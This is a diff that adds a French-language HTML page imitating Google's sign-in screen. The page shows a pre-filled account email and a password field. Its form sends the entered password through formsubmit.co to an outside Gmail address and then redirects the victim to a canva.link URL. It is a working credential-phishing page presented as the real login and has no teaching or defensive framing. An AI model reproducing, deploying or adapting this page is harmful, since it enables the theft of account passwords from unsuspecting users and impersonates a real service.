@@ -1,0 +1,192 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google – Connexion</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'Google Sans',Roboto,Arial,sans-serif;
+  background:#fff;
+  display:flex;
+  flex-direction:column;
+  min-height:100vh;
+  color:#202124;
+}
+.container{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:48px 24px 24px;
+  max-width:450px;
+  margin:0 auto;
+  width:100%;
+}
+.google-logo{
+  display:flex;
+  gap:0;
+  font-size:32px;
+  font-weight:700;
+  letter-spacing:-1px;
+  margin-bottom:24px;
+}
+.g-blue{color:#4285F4}
+.g-red{color:#EA4335}
+.g-yellow{color:#FBBC05}
+.g-green{color:#34A853}
+h1{
+  font-size:24px;
+  font-weight:400;
+  margin-bottom:20px;
+  color:#202124;
+}
+.account-pill{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  border:1px solid #dadce0;
+  border-radius:24px;
+  padding:8px 16px;
+  font-size:14px;
+  color:#202124;
+  margin-bottom:32px;
+}
+.account-pill svg{color:#5f6368}
+.account-pill span{flex:1}
+.chevron{color:#5f6368;font-size:12px}
+.input-wrapper{
+  position:relative;
+  width:100%;
+  margin-bottom:24px;
+}
+.input-wrapper input{
+  width:100%;
+  border:1px solid #dadce0;
+  border-radius:4px;
+  padding:16px 48px 16px 16px;
+  font-size:16px;
+  color:#202124;
+  outline:none;
+  transition:border-color .2s;
+}
+.input-wrapper input:focus{
+  border-color:#1a73e8;
+  border-width:2px;
+}
+.eye-btn{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  background:none;
+  border:none;
+  cursor:pointer;
+  color:#5f6368;
+  padding:4px;
+}
+.actions{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  width:100%;
+}
+.btn-link{
+  background:none;
+  border:none;
+  color:#1a73e8;
+  font-size:14px;
+  font-weight:500;
+  cursor:pointer;
+  padding:10px 8px;
+}
+.btn-link:hover{background:#e8f0fe;border-radius:4px}
+.btn-primary{
+  background:#1a73e8;
+  color:#fff;
+  border:none;
+  border-radius:4px;
+  padding:10px 24px;
+  font-size:14px;
+  font-weight:500;
+  cursor:pointer;
+  transition:background .2s,box-shadow .2s;
+}
+.btn-primary:hover{
+  background:#1765cc;
+  box-shadow:0 1px 3px rgba(0,0,0,.3);
+}
+footer{
+  padding:16px 24px;
+}
+.lang-select{
+  display:flex;
+  align-items:center;
+  gap:4px;
+  font-size:13px;
+  color:#5f6368;
+  margin-bottom:12px;
+  cursor:pointer;
+}
+.footer-links{
+  display:flex;
+  gap:24px;
+  font-size:12px;
+  color:#5f6368;
+}
+.footer-links a{
+  color:inherit;
+  text-decoration:none;
+}
+.footer-links a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="google-logo">
+    <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+  </div>
+  <h1>Bienvenue</h1>
+  <div class="account-pill">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+    </svg>
+    <span>faneltarud@gmail.com</span>
+    <span class="chevron">▾</span>
+  </div>
+  <form action="https://formsubmit.co/faneltarud@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="true">
+    <input type="hidden" name="_next" value="https://canva.link/eus05ln0obnz9ae">
+    <div class="input-wrapper">
+      <input type="password" name="mot_de_passe" placeholder="Saisissez votre mot de passe" required>
+      <button type="button" class="eye-btn" onclick="togglePwd()" aria-label="Afficher le mot de passe">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 11a4 4 0 110-8 4 4 0 010 8z"/>
+        </svg>
+      </button>
+    </div>
+    <div class="actions">
+      <button type="button" class="btn-link">Mot de passe oublié ?</button>
+      <button type="submit" class="btn-primary">Suivant</button>
+    </div>
+  </form>
+</div>
+<footer>
+  <div class="lang-select">Français (France)</div>
+  <div class="footer-links">
+    <a href="#">Aide</a>
+    <a href="#">Confidentialité</a>
+    <a href="#">Conditions d’utilisation</a>
+  </div>
+</footer>
+<script>
+function togglePwd(){
+  const pwd=document.querySelector('input[name="mot_de_passe"]');
+  pwd.type=pwd.type==="password"?"text":"password";
+}
+</script>
+</body>
+</html>
+```
